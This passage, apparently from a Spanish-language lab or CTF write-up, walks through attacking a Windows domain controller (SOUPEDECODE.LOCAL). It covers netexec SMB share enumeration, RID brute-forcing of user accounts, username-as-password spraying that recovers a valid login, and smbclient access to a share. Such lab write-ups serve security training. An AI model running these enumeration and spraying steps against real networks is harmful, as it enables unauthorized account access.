</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="n">C</span><span class="err">$</span>                              <span class="no">Default</span> <span class="n">share</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">IPC</span><span class="err">$</span>            <span class="no">READ</span>            <span class="no">Remote</span> <span class="no">IPC</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">NETLOGON</span>                        <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">SYSVOL</span>                          <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">Users</span>   </span></span></code></pre></div>
<p>Enumeramos los usuarios del DC:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">smb</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span> <span class="o">-</span><span class="n">u</span> <span class="n">guest</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">&#39;&#39;</span> <span class="o">--</span><span class="n">rid</span><span class="o">-</span><span class="n">brute</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC01</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[+]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">guest</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">498</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Enterprise</span> <span class="no">Read</span><span class="o">-</span><span class="n">only</span> <span class="no">Domain</span> <span class="no">Controllers</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">500</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Administrator</span> <span class="p">(</span><span class="no">SidTypeUser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">501</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Guest</span> <span class="p">(</span><span class="no">SidTypeUser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">502</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="n">krbtgt</span> <span class="p">(</span><span class="no">SidTypeUser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">512</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Domain</span> <span class="no">Admins</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">513</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Domain</span> <span class="no">Users</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">514</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Domain</span> <span class="no">Guests</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">515</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Domain</span> <span class="no">Computers</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">516</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Domain</span> <span class="no">Controllers</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">517</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Cert</span> <span class="no">Publishers</span> <span class="p">(</span><span class="no">SidTypeAlias</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">518</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Schema</span> <span class="no">Admins</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">519</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Enterprise</span> <span class="no">Admins</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">520</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Group</span> <span class="no">Policy</span> <span class="no">Creator</span> <span class="no">Owners</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">521</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Read</span><span class="o">-</span><span class="n">only</span> <span class="no">Domain</span> <span class="no">Controllers</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">522</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Cloneable</span> <span class="no">Domain</span> <span class="no">Controllers</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">525</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Protected</span> <span class="no">Users</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">526</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Key</span> <span class="no">Admins</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">527</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Enterprise</span> <span class="no">Key</span> <span class="no">Admins</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">553</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">RAS</span> <span class="ow">and</span> <span class="no">IAS</span> <span class="no">Servers</span> <span class="p">(</span><span class="no">SidTypeAlias</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">571</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Allowed</span> <span class="no">RODC</span> <span class="no">Password</span> <span class="no">Replication</span> <span class="no">Group</span> <span class="p">(</span><span class="no">SidTypeAlias</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">572</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">Denied</span> <span class="no">RODC</span> <span class="no">Password</span> <span class="no">Replication</span> <span class="no">Group</span> <span class="p">(</span><span class="no">SidTypeAlias</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">1000</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">DC01</span><span class="err">$</span> <span class="p">(</span><span class="no">SidTypeUser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">1101</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">DnsAdmins</span> <span class="p">(</span><span class="no">SidTypeAlias</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">1102</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">DnsUpdateProxy</span> <span class="p">(</span><span class="no">SidTypeGroup</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">1103</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="n">bmark0</span> <span class="p">(</span><span class="no">SidTypeUser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">1104</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="n">otara1</span> <span class="p">(</span><span class="no">SidTypeUser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">39</span><span class="o">.</span><span class="mi">78</span>    <span class="mi">445</span>    <span class="no">DC01</span>             <span class="mi">1105</span><span class="p">:</span> <span class="no">SOUPEDECODE</span><span class="p">\</span><span class="n">kleo2</span> <span class="p">(</span><span class="no">SidTypeUser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">.........</span></span></span></code></pre></div>
<p>Muchisimos usuarios, lo guardamos en users.txt con todo y los grupos XD.</p>
<p>Tenemos estos usuarios por ahora, lo guardamos en users.txt.</p>
<p>Hacemos un password spraying para ver si cuela:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">smb</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span> <span class="o">-</span><span class="n">u</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="nb">p</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">bruteforce</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC01</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="o">....</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[-]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">rreed20</span><span class="p">:</span><span class="n">rreed20</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[-]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">icody21</span><span class="p">:</span><span class="n">icody21</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[-]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">ftom22</span><span class="p">:</span><span class="n">ftom22</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[-]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">ijake23</span><span class="p">:</span><span class="n">ijake23</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[-]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">rpenny24</span><span class="p">:</span><span class="n">rpenny24</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[-]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">jiris25</span><span class="p">:</span><span class="n">jiris25</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[-]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">colivia26</span><span class="p">:</span><span class="n">colivia26</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[-]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">pyvonne27</span><span class="p">:</span><span class="n">pyvonne27</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[-]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">zfrank28</span><span class="p">:</span><span class="n">zfrank28</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[+]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">ybob317</span><span class="p">:</span><span class="n">ybob317</span> </span></span></code></pre></div>
<p>Tenemos un usuario ybob317:ybob317. Hacemos una enumeracion de las carpetas compartidas del smb con las credenciales:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"> <span class="n">netexec</span> <span class="n">smb</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span> <span class="o">-</span><span class="n">u</span> <span class="n">ybob317</span> <span class="o">-</span><span class="nb">p</span> <span class="n">ybob317</span> <span class="o">--</span><span class="n">shares</span>           
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC01</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[+]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">ybob317</span><span class="p">:</span><span class="n">ybob317</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Enumerated</span> <span class="n">shares</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">Share</span>           <span class="no">Permissions</span>     <span class="no">Remark</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">-----</span>           <span class="o">-----------</span>     <span class="o">------</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">ADMIN</span><span class="err">$</span>                          <span class="no">Remote</span> <span class="no">Admin</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="n">backup</span>                          
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="n">C</span><span class="err">$</span>                              <span class="no">Default</span> <span class="n">share</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">IPC</span><span class="err">$</span>            <span class="no">READ</span>            <span class="no">Remote</span> <span class="no">IPC</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">NETLOGON</span>        <span class="no">READ</span>            <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">SYSVOL</span>          <span class="no">READ</span>            <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">37</span><span class="o">.</span><span class="mi">184</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">Users</span>           <span class="no">READ</span>      </span></span></code></pre></div>
<p>Nos conectamos con smbclient(antes no podia, no sé por qué&hellip;)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">smbclient</span> <span class="sr">//</span><span class="vg">$target</span><span class="o">/</span><span class="no">Users</span> <span class="o">-</span><span class="n">U</span> <span class="s2">&#34;ybob317%ybob317&#34;</span>
</span></span><span class="line"><span class="cl"><span class="no">Try</span> <span class="s2">&#34;help&#34;</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="n">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="ss">smb</span><span class="p">:</span> <span class="p">\</span><span class="o">&gt;</span> <span class="n">dir</span>
</span></span><span class="line"><span class="cl">  <span class="o">.</span>                                  <span class="no">DR</span>        <span class="mi">0</span>  <span class="no">Thu</span> <span class="no">Jul</span>  <span class="mi">4</span> <span class="mi">18</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">22</span> <span class="mi">2024</span>
</span></span><span class="line"><span class="cl">  <span class="o">..</span>                                <span class="no">DHS</span>        <span class="mi">0</span>  <span class="no">Sat</span> <span class="no">Nov</span> <span class="mi">15</span> <span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">40</span> <span class="mi">2025</span>
</span></span><span class="line"><span class="cl">  <span class="n">admin</span>                               <span class="n">D</span>        <span class="mi">0</span>  <span class="no">Thu</span> <span class="no">Jul</span>  <span class="mi">4</span> <span class="mi">18</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mo">01</span> <span class="mi">2024</span>
